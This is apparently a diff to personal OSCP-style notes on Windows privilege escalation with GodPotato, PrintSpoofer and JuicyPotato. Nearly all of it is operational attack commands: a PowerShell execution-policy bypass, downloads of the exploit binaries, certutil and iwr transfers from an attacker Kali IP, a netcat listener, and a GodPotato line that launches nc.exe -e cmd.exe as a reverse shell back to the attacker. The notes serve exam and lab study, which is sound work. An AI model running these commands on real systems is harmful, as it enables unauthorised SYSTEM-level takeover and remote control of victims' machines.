@@ -4,6 +4,10 @@ Before dropping a payload, you need to know whether the target is 32-bit or 64-b
 
 Run these two commands in your shell:
 
+```
+C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe -ep bypass
+```
+
 ```powershell
 powershell [Environment]::Is64BitOperatingSystem
 ```
@@ -30,7 +34,143 @@ Depending on the Windows version you discovered in Step 1, select your tool from
 - **Tool:** **`PrintSpoofer.exe`** or **`GodPotato.exe`**
     
 - **Why:** Older potato exploits rely on the NTLM authentication provider against the BITS service, which Microsoft patched. `PrintSpoofer` leverages the Print Spooler service via named pipes, which is highly reliable on modern operating systems.
-    
+
+---
+## GodPotato.exe
+
+Find out highest .NET version installed
+```
+reg query "HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP" /s | findstr /i "version"
+```
+
+```
+cd ~/Desktop/Tools/Potatoes &&
+```
+
+.NET 2
+```
+wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET2.exe -O GodPotato.exe
+```
+
+.NET 35
+```
+wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET35.exe -O GodPotato.exe
+```
+
+.NET 4
+```
+wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe -O GodPotato.exe
+```
+
+Transfer onto target
+
+```
+cd ~/Desktop/Tools/Potatoes && python3 -m http.server 80
+```
+
+On WINDOWS target
+
+POWERSHELL
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+
+const command = ` iwr -uri http://${KaliIP}/GodPotato.exe -OutFile C:\Windows\Tasks\GodPotato.exe`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+OR
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+
+const command = `certutil.exe -urlcache -split -f http://${KaliIP}/GodPotato.exe C:\\\Windows\\\Tasks\\\GodPotato.exe`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+
+Start a listener on KALI ATTACKER
+```
+cd ~/Desktop/Tools && python3 penelope.py -p 135 -O / --oscp-safe
+```
+
+Transfer [[Netcat.exe]] to target
+nc.exe > 32 bit
+nc64.exe > 64 bit
+
+```
+cd ~/Desktop/Tools/NC && python -m http.server 80
+```
+
+nc.exe
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+
+const command = `C:\\\Windows\\\System32\\\certutil.exe -urlcache -split -f http://${KaliIP}/nc.exe C:\\\Windows\\\Tasks\\\nc.exe`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+nc64.exe
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+
+const command = `C:\\\Windows\\\System32\\\certutil.exe -urlcache -split -f http://${KaliIP}/nc64.exe C:\\\Windows\\\Tasks\\\nc.exe`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+Catch a reverse connection on the listener
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+
+const command = `GodPotato -cmd "C:\\\Windows\\\Tasks\\nc.exe -t -e C:\\\Windows\\\System32\\\cmd.exe ${KaliIP} 135`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+
+
+---
+## Printspoofer.exe
+
+```
+cd ~/Desktop/Tools/Potatoes &&
+```
+
+(x86) 32 bit
+```
+wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer32.exe -O PrintSpoofer.exe
+```
+
+ (x64) 64 bit
+```
+wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe -O PrintSpoofer.exe
+```
+
+Transfer onto target
+
+```
+cd ~/Desktop/Tools/Potatoes && python3 -m http.server 80
+```
+
+On WINDOWS target
+
+POWERSHELL
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+
+const command = ` iwr -uri http://${KaliIP}/PrintSpoofer.exe -OutFile C:\Windows\Tasks\PrintSpoofer.exe`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+OR
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+
+const command = `certutil.exe -urlcache -split -f http://${KaliIP}/PrintSpoofer.exe C:\\\Windows\\\Tasks\\\PrintSpoofer.exe`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+```
+C:\Windows\Tasks\PrintSpoofer.exe -i -c cmd
+```
+---
 
 ### Option B: Legacy Windows (Windows 7/8, Server 2008/2012)
 
@@ -96,12 +236,12 @@ ON PANE2
 python3 penelope.py -p 9768 -O / --oscp-safe
 ```
 
-(x32)
+(x86) 32 bit
 ```
 wget https://github.com/ivanitlearning/Juicy-Potato-x86/releases/download/1.2/Juicy.Potato.x86.exe -O JuicyPotatox32.exe
 ```
 
- (x64)
+ (x64) 64 bit
 ```
 wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
 ```
